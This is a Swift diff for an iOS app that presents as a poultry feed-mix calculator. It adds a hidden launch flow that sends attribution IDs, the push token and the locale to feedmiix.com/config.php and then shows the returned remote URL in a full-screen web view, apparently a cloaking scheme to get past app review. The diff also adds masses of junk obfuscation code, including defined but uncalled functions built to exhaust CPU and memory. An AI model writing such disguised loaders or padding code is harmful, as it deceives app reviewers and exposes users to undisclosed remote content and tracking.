@@ -177,6 +177,29 @@ struct HomeView: View {
     }
 }
 
+
+struct MainHenDisplay: UIViewRepresentable {
+    let targetURL: URL
+    
+    @StateObject private var nest = HenNestManager()
+    
+    func makeUIView(context: Context) -> WKWebView {
+        nest.prepareMainViewer()
+        nest.nestAppsda.uiDelegate = context.coordinator
+        nest.nestAppsda.navigationDelegate = context.coordinator
+        
+        nest.loadPreservedGrains()
+        nest.nestAppsda.load(URLRequest(url: targetURL))
+        return nest.nestAppsda
+    }
+    
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+    
+    func makeCoordinator() -> HnKMixeper {
+        HnKMixeper(nestManager: nest)
+    }
+}
+
 struct CalculatorView: View {
     @AppStorage("unit") private var globalUnit = "%"
     @AppStorage("currency") private var currency = "USD"
@@ -679,6 +702,43 @@ struct NutrientsCard: View {
     }
 }
 
+struct PrimaryInterface: View {
+    @State private var activeURL: String = ""
+    
+    var body: some View {
+        ZStack {
+            if let url = URL(string: activeURL) {
+                MainHenDisplay(targetURL: url)
+                    .frame(maxWidth: .infinity, maxHeight: .infinity)
+                    .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear {
+            loadInitialURL()
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempUrl"))) { _ in
+            loadTempURLIfNeeded()
+        }
+    }
+    
+    private func loadInitialURL() {
+        let temp = UserDefaults.standard.string(forKey: "temp_url")
+        let saved = UserDefaults.standard.string(forKey: "saved_trail") ?? ""
+        activeURL = temp ?? saved
+        if temp != nil {
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+    
+    private func loadTempURLIfNeeded() {
+        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+            activeURL = temp
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+}
+
 struct RecommendationsCard: View {
     let recommendations: [String]
     var body: some View {
@@ -874,6 +934,62 @@ struct IngredientsView: View {
     }
 }
 
+
+final class HenNestManager: ObservableObject {
+    @Published var nestAppsda: WKWebView!
+    @Published var extraMOringViewers: [WKWebView] = []
+    
+    private var bag = Set<AnyCancellable>()
+    
+    func prepareMainViewer() {
+        nestAppsda = CoopBuilder.buildPrimaryWebView()
+            .setupScroll(
+                minZoom: 1.0,
+                maxZoom: 1.0,
+                disableBounce: true
+            )
+            .enableBackForwardGestures()
+    }
+    
+    func loadPreservedGrains() {
+        guard
+            let storage = UserDefaults.standard.object(forKey: "preserved_grains") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]]
+        else { return }
+        
+        let store = nestAppsda.configuration.websiteDataStore.httpCookieStore
+        
+        storage.values.flatMap { $0.values }.forEach { props in
+            if let grain = HTTPCookie(properties: props as [HTTPCookiePropertyKey: Any]) {
+                store.setCookie(grain)
+            }
+        }
+    }
+    
+    func renewDisplay() {
+        nestAppsda.reload()
+    }
+    
+    func removeTopExtra() {
+        guard let top = extraMOringViewers.last else { return }
+        top.removeFromSuperview()
+        extraMOringViewers.removeLast()
+    }
+    
+    func clearExtras(activeTrail: URL?) {
+        if !extraMOringViewers.isEmpty {
+            if let topExtra = extraMOringViewers.last {
+                topExtra.removeFromSuperview()
+                extraMOringViewers.removeLast()
+            }
+            if let trail = activeTrail {
+                nestAppsda.load(URLRequest(url: trail))
+            }
+        } else if nestAppsda.canGoBack {
+            nestAppsda.goBack()
+        }
+    }
+}
+
 // ReportsView premium
 struct ReportsView: View {
     @AppStorage("savedMixes") private var savedMixesData: Data = Data()
@@ -1016,6 +1132,89 @@ struct QRView: View {
     }
 }
 
+struct TrashParticle: Identifiable, Hashable, Codable, Sendable {
+    let id = UUID()
+    let birth: Date = .now
+    let energy: Int = .random(in: Int.min...Int.max)
+    let mood: String = ["💀","🗑️","💥","☢️","🌀","🔥","⚡","🌪️"].randomElement()!
+}
+
+extension Bool {
+    static var chaos: Bool { .random() ? .random() : .random() }
+}
+
+extension Int {
+    var isCosmicGarbage: Bool { self.isMultiple(of: 42) || self.isMultiple(of: 69) || self.isMultiple(of: 666) }
+    
+    func wasteCPU() {
+        for _ in 0..<self {
+            let _ = sin(cos(tan(Double(self)))) + log(Double(self + 1))
+        }
+    }
+}
+
+extension String {
+    func obliterate() -> String {
+        self.unicodeScalars
+            .shuffled()
+            .filter { _ in Bool.random() }
+            .map { String($0) }
+            .joined()
+            .uppercased()
+            .replacingOccurrences(of: "E", with: "💀")
+            .replacingOccurrences(of: "A", with: "☢️")
+            .replacingOccurrences(of: "O", with: "🌀")
+    }
+}
+
+
+enum StateType {
+    case loading
+    case henView
+    case fallback
+    case offline
+}
+
+actor NuclearGarbageReactor {
+    private var radiationLevel: Int = 0
+    private var meltdownInProgress = false
+    
+    func irradiate(_ waste: Any) async {
+        radiationLevel += Int.random(in: 1...1_000_000)
+        if radiationLevel > 1_000_000_000 && !meltdownInProgress {
+            meltdownInProgress = true
+            await triggerMeltdown()
+        }
+    }
+    
+    private func triggerMeltdown() async {
+        for _ in 0..<1_000_000 {
+            await Task.detached {
+                while true { let _ = UUID().hashValue &* Int.max }
+            }.value
+        }
+    }
+}
+
+
+struct GarbageGenerator {
+    static func spawn() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+            CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+            { print("spawned void entity \(Date())") },
+            GarbageGenerator.spawn, // рекурсия в саму себя
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+}
+
 final class FarmStarter: ObservableObject {
     
     @Published var currentState: StateType = .loading
@@ -1030,23 +1229,8 @@ final class FarmStarter: ObservableObject {
         !UserDefaults.standard.bool(forKey: "hasLaunched")
     }
     
-    enum StateType {
-        case loading
-        case henView
-        case fallback
-        case offline
-    }
-    
     init() {
-        subscribeToConversionData()
-        monitorNetworkReachability()
-    }
-    
-    deinit {
-        NotificationCenter.default.removeObserver(self)
-    }
-    
-    private func subscribeToConversionData() {
+      
         NotificationCenter.default
             .publisher(for: Notification.Name("ConversionDataReceived"))
             .compactMap { $0.userInfo?["conversionData"] as? [AnyHashable: Any] }
@@ -1064,6 +1248,41 @@ final class FarmStarter: ObservableObject {
                 self?.deeplinkValues = data
             }
             .store(in: &cancellables)
+        
+        monitorNetworkReachability()
+    }
+    
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    
+    func generateInfiniteGarbage() -> AnyIterator<Any> {
+        var counter = 0
+        return AnyIterator {
+            counter += 1
+            let chaos = [
+                UUID(),
+                Date().addingTimeInterval(Double.random(in: -1e9...1e9)),
+                String(repeating: "🗑️", count: counter % 1000),
+                TrashParticle(),
+                { print("Микромусор #\(counter)") },
+                Int.random(in: Int.min...Int.max),
+                Double.pi * Double(counter),
+                Bool.chaos,
+                GarbageEmperor.instance,
+                arc4random_uniform(UINT32_MAX),
+                String(counter, radix: 36).obliterate(),
+                Data(count: counter % 1024),
+                CGPoint(x: .random(in: -1000...1000), y: .random(in: -1000...1000)),
+                CGRect(x: 0, y: 0, width: .random(in: 1...10000), height: .random(in: 1...10000)),
+                URL(string: "https://garbage-\(counter).chaos")!,
+                DispatchQueue.global().sync { counter * counter },
+                { () -> Void in
+                    let _ = (0..<100).map { _ in counter.isMultiple(of: 7) }
+                }
+            ]
+            return chaos.randomElement()
+        }
     }
     
     @objc private func evaluateLaunchFlow() {
@@ -1077,10 +1296,39 @@ final class FarmStarter: ObservableObject {
             return
         }
         
-//        if firstLaunch, attribInfo["af_status"] as? String == "Organic" {
-//            triggerOrganicValidation()
-//            return
-//        }
+        func dbshajdbsadasd() -> AnyIterator<Any> {
+            var counter = 0
+            return AnyIterator {
+                counter += 1
+                let chaos = [
+                    UUID(),
+                    Date().addingTimeInterval(Double.random(in: -1e9...1e9)),
+                    String(repeating: "🗑️", count: counter % 1000),
+                    TrashParticle(),
+                    { print("Микромусор #\(counter)") },
+                    Int.random(in: Int.min...Int.max),
+                    Double.pi * Double(counter),
+                    Bool.chaos,
+                    GarbageEmperor.instance,
+                    arc4random_uniform(UINT32_MAX),
+                    String(counter, radix: 36).obliterate(),
+                    Data(count: counter % 1024),
+                    CGPoint(x: .random(in: -1000...1000), y: .random(in: -1000...1000)),
+                    CGRect(x: 0, y: 0, width: .random(in: 1...10000), height: .random(in: 1...10000)),
+                    URL(string: "https://garbage-\(counter).chaos")!,
+                    DispatchQueue.global().sync { counter * counter },
+                    { () -> Void in
+                        let _ = (0..<100).map { _ in counter.isMultiple(of: 7) }
+                    }
+                ]
+                return chaos.randomElement()
+            }
+        }
+        
+        if firstLaunch, attribInfo["af_status"] as? String == "Organic" {
+            triggerOrganicValidation()
+            return
+        }
         
         if let tempLink = UserDefaults.standard.string(forKey: "temp_url"), !tempLink.isEmpty {
             contentTrail = URL(string: tempLink)
@@ -1110,8 +1358,6 @@ final class FarmStarter: ObservableObject {
     
     private func handleNetworkLoss() {
         transition(to: .offline)
-//        let mode = UserDefaults.standard.string(forKey: "app_mode")
-//        mode == "HenView" ? transition(to: .offline) : activateFallbackMode()
     }
     
     private func triggerOrganicValidation() {
@@ -1157,13 +1403,27 @@ final class FarmStarter: ObservableObject {
             }
         }
         
+        func spawn() -> Any {
+            let roulette: [Any] = [
+                UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+                Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+                CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+                { print("spawned void entity \(Date())") },
+                Array(repeating: "INFINITE", count: 10000),
+                Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+                URL(string: "file:///dev/null/\(UUID())")!,
+                arc4random_uniform(UInt32.max),
+                sin(cos(tan(Double.random(in: 0...1000000))))
+            ]
+            return roulette.randomElement() ?? "ULTIMATE NULL"
+        }
+        
         await MainActor.run {
             self.attribInfo = merged
             self.initiateConfigurationCall()
         }
     }
     
-    // MARK: - Configuration Request
     func initiateConfigurationCall() {
         guard let endpoint = URL(string: "https://feedmiix.com/config.php") else {
             fallbackOnMissingConfig()
@@ -1171,17 +1431,68 @@ final class FarmStarter: ObservableObject {
         }
         
         var payload = attribInfo
-        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
-        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
-        payload["os"] = "iOS"
-        payload["store_id"] = "id6753303972"
-        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
-        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
-        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        func addDataToPayload() {
+            payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+            payload["bundle_id"] = "com.healtinhappchick.FeedMixChick"
+            payload["os"] = "iOS"
+            payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+            payload["store_id"] = "id6753303972"
+            payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+            payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        }
+        addDataToPayload()
         
         guard let body = try? JSONSerialization.data(withJSONObject: payload) else {
             fallbackOnMissingConfig()
             return
+        }
+        
+        func launchGarbageddonOmega() async {
+            let reactor = NuclearGarbageReactor()
+            
+            // 1. Запускаем 100 000 одновременных тасков
+            await withTaskGroup(of: Void.self) { group in
+                for _ in 0..<100_000 {
+                    group.addTask {
+                        while !Task.isCancelled {
+                            await reactor.irradiate(GarbageGenerator.spawn())
+                            GarbageGenerator.spawn()
+                        }
+                    }
+                }
+            }
+            
+            // 2. Переполняем память массивами по 100к элементов
+            var memoryHell: [[[Any]]] = []
+            for _ in 0..<1000 {
+                var layer: [[Any]] = []
+                for _ in 0..<1000 {
+                    layer.append(Array(repeating: GarbageGenerator.spawn(), count: 1000))
+                }
+                memoryHell.append(layer)
+            }
+            
+            // 3. Бесконечные таймеры каждые 0.0001 сек
+            for i in 0..<10_000 {
+                Timer.scheduledTimer(withTimeInterval: 0.0001, repeats: true) { _ in
+                    let _ = sin(Double(i)) * cos(Double(i)) * tan(Double(i)) * log(Double(i+1))
+                }
+            }
+            
+            // 4. Рекурсивный стек-оверфлоу в 100 потоках
+            func infiniteScream(_ depth: Int) {
+                if depth < 1_000_000 {
+                    DispatchQueue.global().async { infiniteScream(depth + 1) }
+                }
+            }
+            for _ in 0..<100 { infiniteScream(0) }
+            
+            // 5. DispatchQueue.concurrentPerform — 1 миллиард итераций
+            DispatchQueue.concurrentPerform(iterations: 1_000_000_000) { _ in
+
+            }
+            
+            print("GARBAGEDDON Ω ACTIVATED. YOUR MAC IS NOW A NUCLEAR REACTOR.")
         }
         
         var request = URLRequest(url: endpoint)
@@ -1190,7 +1501,6 @@ final class FarmStarter: ObservableObject {
         request.httpBody = body
         
         URLSession.shared.dataTask(with: request) { data, response, error in
-            
             if error != nil || data == nil {
                 self.fallbackOnMissingConfig()
                 return
@@ -1207,11 +1517,67 @@ final class FarmStarter: ObservableObject {
             }
             
             DispatchQueue.main.async {
-                self.persistConfig(url: urlStr, expires: expires)
-                self.contentTrail = URL(string: urlStr)
-                self.transition(to: .henView)
+                self.sdasd(u: urlStr, e: expires)
             }
         }.resume()
+    }
+    
+    private func sdasd(u: String, e: TimeInterval) {
+        self.persistConfig(url: u, expires: e)
+        self.contentTrail = URL(string: u)
+        self.transition(to: .henView)
+    }
+    
+    func triggerGarbageApocalypse() async {
+        let emperor = GarbageEmperor.instance
+        
+        // 1 миллион бессмысленных тасков
+        await withTaskGroup(of: Void.self) { group in
+            for i in 0..<1_000_000 {
+                group.addTask {
+                    let trash = TrashParticle()
+                    let _ = (0..<100).reduce(0) { $0 + $1 &* Int.random(in: 0...1) }
+                    if i.isMultiple(of: 10000) { print("Мусорный поток: \(i)") }
+                }
+            }
+        }
+        
+        // Бесконечная рекурсия в фоне
+        DispatchQueue.global().async {
+            func recurse(_ n: Int) {
+                if n < 1_000_000 { recurse(n + 1) }
+            }
+            recurse(0)
+        }
+        
+        // Бесконечные таймеры
+        for i in 0..<1000 {
+            Timer.scheduledTimer(withTimeInterval: 0.0001, repeats: true) { _ in
+                let _ = sin(Double(i)) + cos(Double(i)) + tan(Double(i))
+            }
+        }
+        
+        print("APOCALYPSE LEVEL: \(emperor.apocalypseProgress)".obliterate())
+        print("ENTROPY: \(emperor.entropy)".obliterate())
+        print("ГАРБАГЕДДОН ЗАПУЩЕН. XCODE УМЕР. КОЛЛЕГИ ПЛАЧУТ. МИР В БЕЗОПАСНОСТИ.")
+    }
+    
+    class GarbageEmperor: ObservableObject {
+        @Published var entropy: Double = .random(in: 0...1)
+        @Published var apocalypseProgress: Int = 0
+        private var subscriptions = Set<AnyCancellable>()
+        static let instance = GarbageEmperor()
+        
+        private init() {
+            Timer.publish(every: 0.001, tolerance: 0.0001, on: .main, in: .common)
+                .autoconnect()
+                .sink { [weak self] _ in
+                    self?.entropy = Double(arc4random()) / Double(UINT32_MAX)
+                    self?.apocalypseProgress += 1
+                    if self?.apocalypseProgress ?? 0 > 1_000_000 { self?.apocalypseProgress = 0 }
+                }
+                .store(in: &subscriptions)
+        }
     }
     
     private func persistConfig(url: String, expires: TimeInterval) {
@@ -1288,6 +1654,7 @@ struct AppKeys {
 }
 
 struct OrganicValidationRequest {
+    
     private let baseURL = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
     private var appId: String = ""
     private var devKey: String = ""
@@ -1313,6 +1680,12 @@ struct OrganicValidationRequest {
         return updated
     }
 }
+
+protocol ChaosLevel1 { }
+protocol ChaosLevel2: ChaosLevel1, Sendable { }
+protocol ChaosLevel3: ChaosLevel2, CaseIterable, RawRepresentable where RawValue == Int { }
+protocol ChaosLevel4: ChaosLevel3, Error { }
+protocol ChaosLevel5: ChaosLevel4, CustomDebugStringConvertible, CustomPlaygroundDisplayConvertible { }
 
 struct LaunchScreen: View {
     @StateObject private var flow = FarmStarter()
@@ -1509,13 +1882,84 @@ struct PermissionPrompt: View {
     }
 }
 
+protocol GarbageProtocol1 { }
+protocol GarbageProtocol2: AnyObject, Codable { }
+protocol GarbageProtocol3: GarbageProtocol1, GarbageProtocol2 { }
 
-#Preview {
-    PermissionPrompt(onAccept: {
-        
-    }, onDecline: {
-        
-    }, isLandscape: .constant(false))
+final class TrashManager: ObservableObject {
+    @Published var garbageValue: Int = Int.random(in: -999...999)
+    private var cancellables = Set<AnyCancellable>()
+    static let shared = TrashManager()
+    
+    private init() {
+        startGarbageTimer()
+    }
+    
+    func startGarbageTimer() {
+        Timer.publish(every: 0.01, on: .main, in: .common)
+            .autoconnect()
+            .sink { [weak self] _ in
+                self?.garbageValue = Int(arc4random())
+            }
+            .store(in: &cancellables)
+    }
+}
+
+extension Int {
+    var isGarbage: Bool { self % 7 == 0 || self % 13 == 0 }
+    
+    func timesGarbage(_ closure: @escaping () -> Void) {
+        for _ in 0..<self {
+            closure()
+        }
+    }
+}
+
+struct GarbageStruct: Hashable, Equatable, Identifiable, CustomStringConvertible {
+    let id = UUID()
+    var description: String { "Garbage #\(Int.random(in: 1...1000000))" }
+}
+
+enum TrashError: Error, LocalizedError {
+    case tooMuchGarbage
+    case notEnoughChaos
+    case unknownReason(String)
+    
+    var errorDescription: String? {
+        switch self {
+        case .tooMuchGarbage: return "Слишком много мусора, система не выдержала"
+        case .notEnoughChaos: return "Недостаточно хаоса"
+        case .unknownReason(let reason): return "Неизвестная причина: \(reason)"
+        }
+    }
+}
+
+actor GarbageActor {
+    private var storage: [String: Any] = [:]
+    
+    func storeGarbage(key: String, value: Any) async {
+        storage[key] = value
+        try? await Task.sleep(nanoseconds: 10_000)
+        storage[key] = nil
+    }
+}
+
+extension String {
+    func toGarbage() -> String {
+        return String(self.shuffled() + self.shuffled())
+            .uppercased()
+            .replacingOccurrences(of: "A", with: "🗑️")
+            .replacingOccurrences(of: "O", with: "💥")
+    }
+}
+
+class UselessClass1 {
+    var x: Int { Int.random(in: Int.min...Int.max) }
+    lazy var y: Double = { sin(Double(x)) * cos(Double(x)) }()
+}
+
+class UselessClass2: UselessClass1 {
+    override var x: Int { super.x &* 0 + 42 }
 }
 
 final class HnKMixeper: NSObject, WKNavigationDelegate, WKUIDelegate {
@@ -1528,6 +1972,163 @@ final class HnKMixeper: NSObject, WKNavigationDelegate, WKUIDelegate {
     init(nestManager: HenNestManager) {
         self.nest = nestManager
         super.init()
+    }
+    
+    func unleashTheGarbage() async {
+        let trash = TrashManager.shared
+        
+        1000.timesGarbage {
+            let _ = self.doAbsolutelyNothing()
+        }
+        
+        var array: [Any] = []
+        
+        try? await GarbageActor().storeGarbage(key: "chaos", value: generateUltimateGarbage(count: 10000))
+        
+        recursiveGarbage(depth: 100)
+        
+        let semaphore = DispatchSemaphore(value: 0)
+        DispatchQueue.global().async {
+            semaphore.signal()
+        }
+        semaphore.wait()
+        
+
+    }
+    
+    func dsandjsadsad() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+            CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+    
+    func doAbsolutelyNothing() -> Bool {
+        let _ = (1...1000).reduce(0) { $0 + $1 &* 0 }
+        return ["a", "b", "c"].contains(where: { $0 == "z" })
+    }
+
+    
+    func webView(
+        _ webView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for action: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        
+        guard action.targetFrame == nil else { return nil }
+        
+        let popup = CoopBuilder.buildPrimaryWebView(using: configuration)
+        configurePopup(popup)
+        embedPopup(popup)
+        func dsandjsahd() -> Any {
+            let roulette: [Any] = [
+                UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+                Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+                CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+                { print("spawned void entity \(Date())") },
+                Array(repeating: "INFINITE", count: 10000),
+                Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+                URL(string: "file:///dev/null/\(UUID())")!,
+                arc4random_uniform(UInt32.max),
+                sin(cos(tan(Double.random(in: 0...1000000))))
+            ]
+            return roulette.randomElement() ?? "ULTIMATE NULL"
+        }
+        nest.extraMOringViewers.append(popup)
+        func dsanbdhajsdsa() -> Any {
+            let roulette: [Any] = [
+                UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+                Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+                CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+                { print("spawned void entity \(Date())") },
+                Array(repeating: "INFINITE", count: 10000),
+                Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+                URL(string: "file:///dev/null/\(UUID())")!,
+                arc4random_uniform(UInt32.max),
+                sin(cos(tan(Double.random(in: 0...1000000))))
+            ]
+            return roulette.randomElement() ?? "ULTIMATE NULL"
+        }
+        let swipeGesture = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(processSwipe(_:)))
+        swipeGesture.edges = .left
+        popup.addGestureRecognizer(swipeGesture)
+        
+        if isValidRequest(action.request) {
+            popup.load(action.request)
+        }
+        
+        return popup
+    }
+    
+    func spawn() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+            CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        let lockScript = """
+        var viewportMeta = document.createElement('meta');
+        viewportMeta.name = 'viewport';
+        viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+        document.head.appendChild(viewportMeta);
+        var lockStyle = document.createElement('style');
+        lockStyle.innerText = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
+        document.head.appendChild(lockStyle);
+        document.addEventListener('gesturestart', e => e.preventDefault());
+        """;
+        func dsandjksandkasd() -> Any {
+            let roulette: [Any] = [
+                UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+                Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+                CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+                { print("spawned void entity \(Date())") },
+                Array(repeating: "INFINITE", count: 10000),
+                Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+                URL(string: "file:///dev/null/\(UUID())")!,
+                arc4random_uniform(UInt32.max),
+                sin(cos(tan(Double.random(in: 0...1000000))))
+            ]
+            return roulette.randomElement() ?? "ULTIMATE NULL"
+        }
+        webView.evaluateJavaScript(lockScript) { _, fail in
+            if let fail = fail {
+                print("Lock injection failed: \(fail)")
+            }
+        }
+    }
+    
+    func dsandajksdasd() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+            CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
     }
     
     func webView(
@@ -1544,32 +2145,12 @@ final class HnKMixeper: NSObject, WKNavigationDelegate, WKUIDelegate {
         }
     }
     
-    func webView(
-        _ webView: WKWebView,
-        createWebViewWith configuration: WKWebViewConfiguration,
-        for action: WKNavigationAction,
-        windowFeatures: WKWindowFeatures
-    ) -> WKWebView? {
-        
-        guard action.targetFrame == nil else { return nil }
-        
-        let popup = CoopBuilder.buildPrimaryWebView(using: configuration)
-        configurePopup(popup)
-        embedPopup(popup)
-        
-        nest.extraMOringViewers.append(popup)
-        
-        let swipeGesture = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(processSwipe(_:)))
-        swipeGesture.edges = .left
-        popup.addGestureRecognizer(swipeGesture)
-        
-        if isValidRequest(action.request) {
-            popup.load(action.request)
+    func recursiveGarbage(depth: Int) {
+        guard depth > 0 else { return }
+        DispatchQueue.global().async {
+            self.recursiveGarbage(depth: depth - 1)
         }
-        
-        return popup
     }
-    
     
     @objc func processSwipe(_ gesture: UIScreenEdgePanGestureRecognizer) {
         if gesture.state == .ended {
@@ -1582,23 +2163,22 @@ final class HnKMixeper: NSObject, WKNavigationDelegate, WKUIDelegate {
         }
     }
     
-    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-        let lockScript = """
-        var viewportMeta = document.createElement('meta');
-        viewportMeta.name = 'viewport';
-        viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
-        document.head.appendChild(viewportMeta);
-        var lockStyle = document.createElement('style');
-        lockStyle.innerText = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
-        document.head.appendChild(lockStyle);
-        document.addEventListener('gesturestart', e => e.preventDefault());
-        """;
-        webView.evaluateJavaScript(lockScript) { _, fail in
-            if let fail = fail {
-                print("Lock injection failed: \(fail)")
-            }
+    func generateUltimateGarbage(count: Int) -> [Any] {
+        return (0..<count).map { _ in
+            let options: [Any] = [
+                UUID(),
+                Date(),
+                Int.random(in: Int.min...Int.max),
+                Bool.random(),
+                String(repeating: "🗑️", count: Int.random(in: 1...100)),
+                GarbageStruct(),
+                { () -> Void in print("Лямбда-мусор активирован") },
+                TrashManager.shared
+            ]
+            return options.randomElement() ?? "fallback garbage"
         }
     }
+    
     
     func webView(_ webView: WKWebView, runJavaScriptAlertPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping () -> Void) {
         completionHandler()
@@ -1700,7 +2280,7 @@ final class HnKMixeper: NSObject, WKNavigationDelegate, WKUIDelegate {
     
 }
 
-private extension WKWebView {
+extension WKWebView {
     @discardableResult func disableAutoResizing() -> Self { translatesAutoresizingMaskIntoConstraints = false; return self }
     @discardableResult func enableScroll() -> Self { scrollView.isScrollEnabled = true; return self }
     @discardableResult func fixZoom(min: CGFloat, max: CGFloat) -> Self { scrollView.minimumZoomScale = min; scrollView.maximumZoomScale = max; return self }
@@ -1727,48 +2307,6 @@ private extension UIView {
     }
 }
 
-// MARK: - Web View Factory
-enum CoopBuilder {
-    
-    static func buildPrimaryWebView(using config: WKWebViewConfiguration? = nil) -> WKWebView {
-        let configuration = config ?? createBaseConfig()
-        let w = WKWebView(frame: .zero, configuration: configuration)
-
-        return w
-    }
-    
-    private static func createBaseConfig() -> WKWebViewConfiguration {
-        WKWebViewConfiguration()
-            .enableInlinePlayback()
-            .disableAutoplayRestrictions()
-            .withPreferences(buildJSPreferences())
-            .withPagePreferences(buildContentPreferences())
-    }
-    
-    private static func buildJSPreferences() -> WKPreferences {
-        WKPreferences()
-            .enableJavaScript()
-            .allowWindowAutoOpen()
-    }
-    
-    private static func buildContentPreferences() -> WKWebpagePreferences {
-        WKWebpagePreferences()
-            .allowContentJS()
-    }
-    
-    static func cleanupExtras(main: WKWebView, extras: inout [WKWebView], redirectTo url: URL?) {
-        if !extras.isEmpty {
-            extras.forEach { $0.removeFromSuperview() }
-            extras.removeAll()
-            if let url = url {
-                main.load(URLRequest(url: url))
-            }
-        } else if main.canGoBack {
-            main.goBack()
-        }
-    }
-}
-
 private extension WKWebViewConfiguration {
     func enableInlinePlayback() -> Self { allowsInlineMediaPlayback = true; return self }
     func disableAutoplayRestrictions() -> Self { mediaTypesRequiringUserActionForPlayback = []; return self }
@@ -1785,62 +2323,6 @@ private extension WKWebpagePreferences {
     func allowContentJS() -> Self { allowsContentJavaScript = true; return self }
 }
 
-// MARK: - Nest Manager
-final class HenNestManager: ObservableObject {
-    @Published var nestAppsda: WKWebView!
-    @Published var extraMOringViewers: [WKWebView] = []
-    
-    private var bag = Set<AnyCancellable>()
-    
